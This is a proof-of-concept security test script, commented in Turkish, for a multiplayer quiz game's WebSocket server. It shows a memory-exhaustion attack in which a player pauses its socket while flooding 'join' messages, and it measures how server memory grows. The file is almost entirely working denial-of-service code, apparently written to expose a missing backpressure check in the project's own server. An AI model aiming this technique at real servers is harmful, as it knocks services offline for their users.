// PoC: poc-shazam-amplify'ın devamı — saldırgan (host olmayan oyuncu) kendi soketinden okumayı durdurur ama `join`
// göndermeye devam eder. Sunucu her ~700 KB'lık view'i o soket için bellekte biriktirir (bufferedAmount kontrolü yok).
// Ölçülen: sunucu sürecinin bellek kullanımı (Windows tasklist). Kullanım: node tests/security/poc-shazam-backpressure.mjs
import { execSync } from 'node:child_process';
import { startServer } from '../lib/server.js';
import { makeRoom, sleep } from '../lib/bot.js';

const srv = await startServer({ timeScale: 1 });
const pid = execSync('netstat -ano -p tcp').toString().split('\n')
  .find((l) => l.includes(`:${srv.port} `) && l.includes('LISTENING')).trim().split(/\s+/).at(-1);
const mem = () => execSync(`tasklist /FI "PID eq ${pid}" /FO CSV /NH`).toString().split('","')[4].replace('"', '').trim();

const { bots, host, code } = await makeRoom(srv.wsUrl, 'shazam', 3, 'P');
const attacker = bots[2];
const pad = '\u0001'.repeat(196);
const mk = (i) => ({ title: `t${i}${pad}`, artist: `a${i}${pad}`, audio: 'https://p.scdn.co/mp3-preview/x' });
let n = 0;
for (let msg = 0; n < 300; msg++) {
  host.send({ t: 'prep', data: { op: 'add', tracks: [mk(n++), mk(n++), mk(n++)] } });
  if (msg % 25 === 24) await sleep(5200);
}
await host.waitRoom((r) => r.prep?.trackCount >= 300, { timeout: 20000 });
host.send({ t: 'start' });
await attacker.waitView((v) => v.phase === 'play');
console.log('sunucu belleği (saldırı öncesi):', mem());

attacker.ws._socket.pause(); // TCP alma penceresi dolar; sunucu yazmaya devam eder → kullanıcı alanında birikir
const t0 = Date.now();
while (Date.now() - t0 < 45_000) {
  for (let i = 0; i < 29; i++) attacker.send({ t: 'join', code });
  await sleep(5050);
  console.log(`${Math.round((Date.now() - t0) / 1000)} sn → sunucu belleği:`, mem(), attacker.closed ? '(saldırgan kapatıldı)' : '');
}
bots.forEach((b) => b.close());
await srv.stop();
